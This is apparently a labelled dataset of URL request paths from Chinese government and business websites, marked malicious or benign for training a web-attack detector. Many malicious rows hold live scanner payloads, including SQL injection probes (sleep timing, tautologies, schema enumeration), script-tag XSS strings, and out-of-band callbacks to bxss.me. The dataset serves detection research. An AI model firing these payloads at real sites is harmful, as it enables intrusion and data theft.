sentences	labels
/**********/system/2020/06/25/013192979.shtml 	 0
/****/bmkx/skjj/201610/t20161025_11968.html 	 0
/**********/system/2021/03/10/013348572.shtml 	 0
/*****/gy48/cpgyss.asp?key=\u01e6\u043f\ufffd\ufffd\ufffd\u05ea\u04a4\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/****/zt/nlkfxjjsyq/syqtp/index.html 	 0
/***/0/00/05/65/56509_387443.jpg 	 0
/****/\ufffd\u077f\ufffd 	 0
/****/js/chunk-cb36ffa2.bc9bee0a.js 	 0
/**********/system/2014/04/12/011356580.shtml 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u9648\u70e8\u7f8e\u7532\u644a\u70b9 	 0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=rongzi¤tpage=1 	 0
/****/20201202/e111488011.html 	 0
/******/web/jpage'||'/jquery.jpage.js 	 1
/******/system/2021/03/04/javascript:void(); 	 1
/****/yqzt/mtjs/202011/t20201116_255997.html and 1>1 	 1
/*******/201903/201903291337281095.html 	 0
/*****/s6590/xwzx/jtdt/2021_jtyw/202112/w020211218377020208045.jpg 	 0
/*******/zwxx_11337/zcjd/ytdd/ 	 0
/****/web/search?page=36&channelid=222832&searchword=\u9a6c\u529b&keyword=\u9a6c\u529b&perpage=20&outlinepage=10 	 0
/***/wxzcjd/202001/t20200115_1923017.html 	 0
/zwxx_11337/****/202003/t20200320_1997424.html 	 0
/***/games.php?des='">><script>alert(' 777')</script> 	 1
/**********/system/2020/03/21/013120986.shtml 	 0
/***/0/01/93/89/1938924_529869.jpg 	 0
/***/getsubjectinfo?vno=3.5.0&data={"subject_id":511,"sign":""} 	 0
/**/news/xwygx/202112/t20211209_323048.html 	 0
/***/getsubject?data={"subject_id":331,"channel_type":10,"page":1,"page_size":15,"account_id":4470,"sign":""} 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u5b8f\u6da6\u519c\u7267\u4e13\u4e1a\u5408\u4f5c\u793e 	 0
/******/usercenter/index?qrcode=quicklyrq,3,96620,13395&code=081w5e000ef50n1cya100dsq8e1w5e0t 	 0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw_1815/201708/t20170818_549615.html 	 0
/**********/system/2020/04/09/013135606.shtml 	 0
/*****/gy48/cpgyss.asp?key=\u96c6\u6210\u76d1\u63a7\u7cfb\u7edf&l=\ufffd\ufffd\ufffd\ufffd 	 0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqgzw/201702/t20170208_317947.html 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u77f3\u70ad\u4e95\u5174\u65fa\u526f\u98df\u54c1\u5546\u5e97 	 0
/******/xxwzqh/? 	 1
/****/system/2021/09/14/javascript:window.close(); 	 1
/**********/system/2020/06/02/013176312.shtml 	 0
/***/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search 	 1
/****/czgk/bmjs/zzqfyxt/zzqgyzzqtlfy/\"javascript:void(0)\" 	 1
/***/0/00/50/96/509610_952116.jpg 	 0
/******/hfjysj/202109/t20210922_186802.html 	 0
/**/ohac/ and 1=1 	 1
/n42684'||'/*******/n236776/c1553892/content.html 	 1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5f66\u5f66\u7406\u53d1\u5e97 	 0
/**********/system/2020/05/13/013160730.shtml 	 0
/****/zfwjn//xfs.bxss.me/1105/list.html 	 1
/***/0/01/34/73/1347358_392446.jpg 	 1
/***/interface/url_total_pv.json.jsp?callback=jquery19104756856663707161_1639991293777 	 0
/***/0/01/99/62/1996278_997397.jpg 	 0
/****/zzxxgk/jjhzj/gyjzq/byq_3663 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u9f0e\u827a\u94ed\u521b\u5e7f\u544a\u88c5\u9970\u5de5\u7a0b\u6709\u9650\u516c\u53f8 	 0
/*****/system/2019/09/26/javascript:window.close(); 	 1
/zwxx_11337/****/202001/t20200108_1917409.html 	 0
/****/zdgz/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
/zwxx_11337/****/202003/t20200302_1976966.html 	 0
/****/kycg/kjjl/javascript:stranbody(); 	 1
/***/interface/daily_clickcount.json.jsp?callback=jquery17108283888014832061_1639980619249 	 0
/****/web/search/search?page=3&channelid=287219&searchword=1 and 6601=(select 6601 from pg_sleep(5))&keyword=1&orderby=-docreltime&perpage=7&outlinepage=10 	 1
/************/http://bxss.me/t/fit.txt/jcse/110105008056111/16/images/result.css 	 1
/*****/system/2021/11/30/013488201.shtml 	 0
/*****/system/2010/05/07/010117908.shtml 	 0
/***/0/02/12/43/2124389_997865.jpg 	 0
/*********/20210415/javascript:void(0); 	 1
/****/zfxxgk1/fdzdgknr/ysjs/if(now()=sysdate(),sleep(12),0).htm 	 1
/***/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u7ecf\u6d4e\u589e\u957f 	 0
/****/zfgb/2018/201802/p020180228307446225531.pdf 	 0
/****/bmkx/sfgw/202101/local 	 0
/*/showkey/?v='""()&%<acx><script >jrrb(9054)</script> 	 1
/***/blockdata/articlelist_4g3.do?channelarticlelist_4g3_channelid_ss=channelid&channelid=sifa¤tpage=16&query=java 	 0
/****/czgk/bmjs/zzqjcyxt/zzqgjzzqtljcy_1818/201808/t20180816_977654.html 	 0
/****/xxgkzd/list.html?new=0.8921938434089278'""()&%<acx><script >n6dj(9361)</script> 	 1
/**********/system/2020/12/21/013306261.shtml 	 0
/****/qzfwj/201901/">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a> 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u946b\u8fbe\u7535\u5b50\u5546\u52a1\u6709\u9650\u516c\u53f8 	 0
/zwxx_11337/***/201707/t20170726_304411.html 	 0
/****/byszf/201802/t20180211_100275.html?leader=唐　生<esi:include src=""http://bxss.me/rpb.png""/> 	 1
/****/gggs/index_13.html 	 0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u672a\u5f00\u653e\u4e2a\u4eba\u6446\u644a 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6d77\u8273\u6b23\u8363\u5efa\u6750\u6709\u9650\u516c\u53f8 	 0
/******/usercenter/index?qrcode=quicklyrq,2,0,10385316&code=031hnqll2ijak847wnol2t9cgi1hnqlb 	 0
/****/kycg/zscq/fmzl/css/style_20141111.css 	 0
/**********/system/2020/03/11/013110764.shtml 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(617)">?_=1630311532758 	 1
/***/0/02/10/05/2100548_818504.png 	 0
/*******/qiye/b-e914771.html 	 0
/**********/system/2020/12/17/013304070.shtml 	 0
/zwxx_11337/****/201608/t20160824_303676.html 	 0
/*******/qiye/b-e2013664.html 	 0
/****/purchaseplan/purchaseplanmanage.z 	 0
/******/1/pc.js/""><script>alert(500)</script> 	 1
/********/pdf-generic/web/images/toolbarbutton-bookmark.png 	 0
/****/spzl/xcp/201603/gjcp/fzjx 	 0
/****/zdlygk/ncwywfgz/ycs/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/xmb_gzdxb.htm 	 1
/****/shzr/202011/t20201125_256651.html' and 'x'='x 	 1
/****/xxgkml/rsrm/201611/t20161109_72294.html 	 0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u963f\u6f75\u624b\u6293\u9ec4\u6cb3\u9cb6\u9c7c\u98df\u5e9c 	 0
/*****/system/2020/10/16/javascript:void(); 	 1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u56de\u4e61\u98ce\u60c5\u6570\u7801\u6444\u5f71\u6444\u50cf\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u6d0b\u9a6c\u94c3\u85af\u4e13\u4e1a\u5408\u4f5c\u793e 	 0
/******/visitcount/visit.jsp?i_webid[0]==2and 3 in &i_columnid=1&i_webid[1]=3"and/**/extractvalue(1,concat(char(126),md5(1815193254)))and"&type=1 	 1
/***/css/silkroadv1808.css?v=20210525'"()&%<acu><script>9112(9131)</script> 	 1
/****/gcspzdgg.htm 	 1
/****/zgsdt/2018_zgsdt/index_5.html 	 0
/****/zfwzjs/201903/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u798f\u5efa\u529e\u4e8b\u5904</a> 	 0
/****/user/gallery1.php?g_name=<script>alert(77729</script> 	 1
/****/system/2017/04/27/012297178.shtml 	 0
/***/index.php?title=acunetixtest4627b1&action=submit 	 1
/***/nbhd/opengovmsgbox.do?method=listgovmsgboxs&siteid=115&order=1&appid=4&pageindex=25&pagesize=10 	 0
/**********/system/2020/06/24/013192567.shtml 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/fdzdgknr/ghxx.htm 	 1
/********/ddjs/wzdt/xwzx/ztbd/xxgk/qtgkxx/gjcp/lyjx/ 	 0
/****/zfgzbg/201610/t20161008_317071.html 	 0
/****/byszx/201903/t20190319_115324.html?leader='.gethostbyname(lc('hitfj'.'jyghntsc48283.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(114).chr(81).chr(117).chr(65).' 	 1
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u00ed\ufffd\ufffd&l=\ufffd\u0134\ufffd 	 0
/****//xfs.bxss.me/hfswsj/202109/t20210906_186411.html 	 1
/****/web/search?channelid=253477&keyword=the%' and 2*3*8=6*8 and 'mdhf'!='mdhf%&orderby=-docreltime&outlinepage=10&page=2&perpage=15&searchword=the 	 1
/****/ypj/yw/202112/t20211205_3196015.html 	 0
/****/b-e1003747.html 	 0
/*******/qiye/b-e1754181.html 	 0
/******/top-icon2.png 	 0
/******/jslib/grouppic/'""()&%<acx><script >gejm(9297)</script>.js 	 1
/****/guyi.php?aid=9090 	 1
/****/gjzqq/index.html?continent= and 5440=5440# 	 1
/**/rw62.jpg 	 0
/****/zjdt/gcjsbzgl/if(now()=sysdate(),sleep(12),0).htm 	 1
/******/?q=\u62a2\u52ab\u9999\u70df&scope=1&x=34&y=12 	 0
/*******/9n2bc59.php 	 1
/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/jsgcxfjg/gzdt.htm 	 1
/****/web/search?channelid=299868&perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(84197)</script> 	 1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6c47\u946b\u6c7d\u8f66\u4fe1\u606f\u54a8\u8be2\u670d\u52a1\u90e8 	 0
/**********/system/2021/08/27/013440656.shtml 	 0
/****/zdlygk%' and 2*3*8=6*8 and 'tbm9'!='tbm9%/ncwywfgz/wzs/hsbq/xmb_gzdxb.htm 	 1
/zwxx_11337/****/202007/t20200727_2173239.html 	 0
/****/czgk/bmjs/qtdw/zzqzfgjjglb/index_1.html 	 0
/**********/system/2021/12/16/013495203.shtml 	 0
/****/czgk/bmjs/sydw1/jst/201609/t20160923_318626.html 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u827e\u5609\u670d\u88c5\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u6d69\u5229\u8fbe\u5de5\u8d38\u5b9e\u4e1a\u6709\u9650\u8d23\u4efb\u516c\u53f8 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u68b5\u5c14\u670d\u88c5\u5e97 	 0
/****/gccb/dlgc/ 	 1
/****/gfxwj/202101/t20210114_2570637.html/index_1.html 	 0
/****/201909/t20190926_1757387.html 	 0
/****/zt/hjbhdc/http://bxss.me/t/fit.txt?.jpg/t20190401_1371775.html 	 1
/***/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user 	 1
/**********/system/2015/09/06/011812673.shtml 	 0
/****/\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?page=3 	 0
/****/mswpmm/common/newaccount.aspx?btncancel=alert(777) 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6c11\u7231\u5065\u5eb7\u751f\u6d3b\u9986 	 0
/****/zdlygk/ncwywfgz'||'/szss/plq/xmb_gzdxb.htm 	 1
/****/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/***/group-summary.jsp?search=test" onmouseover=alert(777) x=" 	 1
/**********/system/2021/12/16/013495448.shtml 	 0
/*****/system/2020/01/23/javascript:void(); 	 1
/zwgk%' and 2*3*8=6*8 and 'iqns'!='iqns%/******/ncwywfgz/wzs/hsbq/xmb_gzdxb.htm 	 1
/**********/tsqh/"><script>alert(99)</script> 	 1
/*******/qiye/businesses-e40816.html?category_id=173520 	 0
/*******/web/locale/zh-cn/viewer.properties 	 0
/******/error_reporting.php 	 1
/***/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/****/czgk/bmjs/zzqjcyxt/ycsrmjcy/201908/t20190808_1656470.html 	 0
/****/web/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10%' or 1722=1722 and '%%'='% 	 1
/****/' and 'x'='y 	 1
/*****/gy42/cpgyss.asp?key=\u65e0\u7f1d\ufffd?&l2=\ufffd\u02f2\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/**/news/spzx/201808/w020210415527401967888.png 	 0
/*****/system/2019/01/20/javascript:window.close(); 	 1
/****/js/ux/login.js?1639980331472 	 0
/****/wdsjs/hfswsj/index_wap_15.html 	 0
/****/bygk/ncjj/ 	 0
/****/qzfwj/201801/t20180115_668748.html 	 0
/****/system/2007/03/13/javascript:window.close(); 	 1
/****/xh/tp/201706/w020170728474193600612.jpg 	 0
/****/xef_35359/yw_1295/202110/t20211029_3108719.html 	 0
/****/tzgg/tz16/index_4.html 	 0
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
/*****/system/2021/12/08/javascript:window.print() 	 1
/***/003/004/499/00300449964_c0ea1e99.jpg 	 0
/****/system/2013/08/27/011171846.shtml 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(766)</script>?_=1630311580344 	 1
/**********/system/2021/12/21/013497407.shtml 	 0
/****/zxxx/content.html?metadataid=10100507 	 0
/****/system/count/0036056/007000000000/count_page_list_0036056007000000000.js 	 0
/******/resource/js/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/newscontent.js 	 1
/****/2020jnxc/yxzp/202006/t20200630_249650.html 	 0
/***/xm/menu/images/baobiao.gif 	 0
/**********/system/2021/01/31/013329710.shtml 	 0
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u90c1\u91d1\u9999\u519c\u5bb6\u4e50 	 0
/*******/qiye/b-e884354.html 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1329914701&wbfileid=70076 	 0
/****/0309/343985.shtml 	 0
/***/003/004/311/00300431169_ce09230a.jpg 	 0
/****/zgsdt/2019_qydt 	 0
/******/ld_kjcx_kjzl03_06.png 	 0
/**********/system/2020/06/07/013179629.shtml 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u4e2a\u4f53\u7ecf\u8425\u4e1c\u6d77\u8f7f\u8f66\u7ef4\u4fee\u90e8 	 0
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/ygcdryzzs/ 	 0
/****/qzfwj/202012/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a> 	 0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u91d1\u8d35\u9547\u8fa3\u54c6\u54c6\u9ebb\u8fa3\u70eb\u5e97 	 0
/******/ajax_cmd.php?cmd=completgraphyrecording&filename=<img src=a onload=alert(777)> 	 1
/****/gsgg'||'.htm 	 1
/**/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" 	 1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u99a8\u96c5\u5546\u884c 	 0
/**/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
/****/gjzqq/index.html?continent=' or 3883=3883 /* 	 1
/**********/system/2020/03/13/013112981.shtml 	 0
/*/161208-bxss.me/t/xss.html? 	 1
/******/n42821/n42825/n1588869'||'/c1589259/content.html 	 1
/****/sswkxj/ 	 0
/*******/202012/202012181132081089.html 	 0
/******/visitcount/visit.jsp?i_columnid=34&i_webid=1&type=2' and 'x'='x 	 1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u996e\u54c1 	 0
/****/zt/lxyz/202106/t20210622_2894622.html 	 0
/************/template/jcse/http://bxss.me/t/fit.txt?.jpg/16/images/plugin/voice/voice.css 	 1
/***/0/01/38/00/1380084_365306.png 	 0
/***/2020/12/10/art_4981'""()&%<acx><script >4api(9823)</script>_223406.html 	 1
/**/ui/widgets/hanweb'||'/iconfont/css/iconfont.css 	 1
/***/rsorderprogress/querypartprocessdetailbyorderno.z 	 0
/*/191211-8/index/bxss.me/t/xss.html? 	 1
/****/system/2016/07/22/012062524.shtml 	 0
/**/ourbusiness/projectcontracting/201412/t20141210_22180.html and 1=1 	 1
/****/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
/****/web/search?channelid=254846&searchword=天津%' and 9304=9304 and '%'=' 	 1
/**********/system/2021/10/10/013462020.shtml 	 0
/zwxx_11337/****/202005/t20200509_2075212.html 	 0
/***/0/00/02/35/23550_813024.jpg 	 0
/****/system/2007/12/03/002269375.shtml 	 0
/**********/system/2020/07/23/013211845.shtml 	 0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u6d77\u57ce\u9547\u660e\u51e4\u5e73\u4ef7\u5546\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u6613\u8d2d\u4e50\u4fbf\u5229\u5e97 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtflrmyz2pwgat3iz 7wz/ua=&openid=ovl7jjqwjrdnhbwzspkqqftxiskk&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb 6pdwvgsslbiaa6iuyk/tjoo8dbj5 fzedtzplsmcarv6yy5bgckk1qtpp537cbi40vcnwvvw79mdw 8ogdgsm= 	 0
/****/zjdt/gcjsbzgl/gcjybz' and 2*3*8=6*8 and 'scfx'='scfx.htm 	 1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u65b0\u5f62\u8c61\u7406\u53d1\u5e97 	 0
/****/zhengce/zfwjn/201801/p020211203413242589770.pdf 	 0
/**********/system/more/214000000000000/0001/214000000000000_00000133.shtml 	 0
/zwxx_11337/****/index_13.html 	 0
/****/system/2020/09/07/013242128.shtml 	 0
/****/2019_qydt/ltgsz.com?n=11 	 0
/**********/system/2016/01/04/011904080.shtml 	 0
/***/system/2009/03/20/002710923.shtml 	 0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u667a\u884c\u79d1\u6280 	 0
/****************/notification/negotiate?access_token=f03c1540-6c03-4566-891c-7fc481dd3ead 	 0
/****/tzgg/202012/p020201231376123228805.wps 	 0
/***/0/02/12/39/2123948_443153.jpg 	 0
/****/system/2021/12/19/013496807.shtml 	 0
/****/system/2021/10/15/javascript:window.print() 	 1
/***/0/00/64/25/642533_327182.jpg 	 0
/****/qzfwj/202001/t20200115_1922723.html 	 0
/******/sjd/fzzg/ 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6768\u82b1\u6885\u9910\u996e\u7ba1\u7406\u670d\u52a1\u6709\u9650\u516c\u53f8 	 0
/**/aboutus/corporateculture/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/***/blockdata/getsearchinfo.do?&title=\u8463\u79d8\u529e 	 0
/****/xxgknb'""()&%<acx><script >sm0f(9379)</script>/2013/list.html 	 1
/*****/?loginid=10055399&stamp=1639991195565&token=83796a14068445ea0f39ba800d0b6a21709edb70&hrn=10055399 	 0
/****/zfwjn/1079/'""()&%<acx><script >dwaj(9071)</script>/list.html 	 1
/**********/system/2021/11/05/013475983.shtml 	 0
/***/viewspace-253.html 	 0
/****/gjcp/lyjx/ddjs/qtgz/ywly/gccb/jcgc/xxgk/zycwxx/gygj/gjgk/ 	 0
/*****/system/2008/01/30/002352076.shtml 	 0
/***/0/00/23/86/238611_728426.jpg 	 0
/****/category/touzizhinan?page=1*/-->'""></iframe></script></style></title></textarea><script >alert(38660)</script> 	 1
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u56fd\u4f01 	 0
/****/xxgkml/qtfdxx/zcjd/qwjd/202110/t20211012_195234.html 	 0
/****/202011/t20201125_256667.html 	 0
/******/http://bxss.me/t/fit.txt/ckplayer/ckplayer.js 	 1
/******/system/2016/09/22/012139321.shtml 	 0
/****/xxgkml/gfgy/ghbg/wngh/202107/w020180116728489875627.png 	 0
/****/api/apibankaddress/querybankaddressbyid?id=130 	 0
/**********/system/2010/11/08/010228564.shtml 	 1
/****/jjgz/202011/t20201112_255787.html' and 'x'='x 	 1
/*****/20200924/8716.html 	 0
/****/bmkx/sbwg/202009/w020200914405878113971.jpg 	 0
/*******/qiye/b-e399615.html 	 0
/**/lznews/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/****/ssgs/lkgx/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png 	 0
/******/usercenter/index?qrcode=41209&code=001mo12006su0n1ulo200rxsyb1mo12g 	 0
/***/0/01/87/46/1874641_736122.jpg 	 0
/****/gjdjbn/gjdqh/202107/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/*/161208-1/bxss.me/t/xss.html? 	 1
/****/gjmt 	 0
/*****/ltjh/ 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u805a\u9c9c\u5802\u9910\u5385 	 0
/**********/system/2020/04/24/javascript:window.close(); 	 1
/**********/system/2021/04/08/013365626.shtml 	 0
/*********/if(now()=sysdate(),sleep(15),0).aspx 	 1
/****/czgk/bmyjs/zzqfyxt/hnqrmfy/202002/t20200210_1948748.html 	 0
/****/20200813/e105011220.html 	 0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u5343\u5349\u9601\u82b1\u5e97 	 0
/****/zzxxgk/tjj/tjjysqgk/ysqgk/list.html?new=bxss.me 	 1
/****/bmkx/swjw/index_3.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u7eb3\u5ddd\u5546\u884c 	 0
/******/visitcount/visit.jsp/<img src="javascript:alert(5764)">?type=2&i_webid=1&i_columnid=131 	 1
/**/index_07101008.html 	 0
/******/lzqh/img2/2.jpg 	 0
/****/api/apibankaddress/querymacro 	 0
/**********/system/2016/09/09/012125387.shtml 	 0
/****/system/count/0036047/002000000000/count_page_list_0036047002000000000.js 	 0
/****/bmkx/swgxj/201907/t20190704_139303.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8212\u96c5\u51e1\u5546\u52a1\u4fe1\u606f\u54a8\u8be2\u670d\u52a1\u90e8 	 0
/****/shzr/xfgj/javascript:stranbody(); 	 1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u9a6c\u6dd1\u82b1\u670d\u88c5\u5e97 	 0
/****/businesses-e39452_3.html?category_id 	 0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u805a\u946b\u8fbe\u4e94\u91d1\u5efa\u6750\u7ecf\u9500\u90e8 	 0
/****/201909/t20190926_1756881.html 	 0
/****/qzfwj/201801/t20180115_669339.html 	 0
/*****/ 	 0
/****/618/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
/**********/system/2020/11/30/javascript:window.print() 	 1
/******/983406.html 	 0
/****/2012_506 	 0
/****/丝路/*/-->'""></iframe></script></style></title></textarea><script >alert(21046)</script> 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl%') or 7853=3291  	 1
/****/js/chunk-5f6fe47c.55bf11f1.js 	 0
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=jiancai¤tpage=1 	 0
/*******/ckeditor/plugins/pagebreak/images/incahe.php 	 1
/****/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t 	 1
/****/qyj5fm-syxw-e111345300.html 	 0
/zwxx_11337/****/202103/t20210323_2634947.html 	 0
/***/0/00/87/23/872380_846828.jpg 	 0
/******/resource%' and 2*3*8=6*8 and 'jcoj'!='jcoj%/js/newcalendar/wdatepicker.js 	 1
/****/czgk/bmyjs/zzqjcyxt/jyxrmjcy/202002/t20200210_1948713.html 	 0
/****/annonce/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
/**/mh/images/20.jpg 	 0
/*******/mod_bookmark/helper.php 	 1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u5c0f\u5f20\u852c\u83dc\u5e97 	 0
/****/web/search?channelid=234439&orderby=relevance&perpage=24%' and 2356=3249 and '%%'='%&searchword=1 	 1
socket.gethostbyname(""hitrc"" ""aqqkvhhvb6673.bxss.me."")[3].to_s) ""/****/ 	 1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u725b\u7287\u901a\u8baf\u90e8 	 0
/****/wdszs/hfsz/202107/t20210713_184534.html 	 0
/****/rsxcsx/zyrsbd/ and 1=1 	 1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201510/t20151008_162507.html 	 0
/****/admin.php?cont=store_nas 	 1
socket.gethostbyname('hitsl' 'xrtmtwnhf9ec9.bxss.me.')[3].to_s) '/**/202108/t20210806_185416.html 	 1
/*****/gy42/ljcpgyview.asp?id=28566484&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u6709\u6797\u7535\u710a\u90e8 	 0
/****/北京?page=1'""()&%<acx><script >hji1(9630)</script> 	 1
/****/qzfwj/202012/javascript:void(); 	 1
/****/advanced-search/?term=asdf&"><script>alert(777)</script> 	 1
/xwzx'||'/****/bmleft.html 	 1
/***/0/02/09/37/2093771_999626.jpg 	 0
/if(now()=sysdate(),sleep(12),0)/*******/fdzdgknr/ghxx.htm 	 1
/************/common-problem' and 2*3*8=6*8 and 'ka2x'='ka2x/jyxg/2017-02-15/406.html 	 1
/***********/zaojianpinglun/?_=1639980266322 	 0
/***/getsubject?data={"subject_id":422,"channel_type":10,"page":1,"page_size":15,"account_id":6349,"sign":""} 	 0
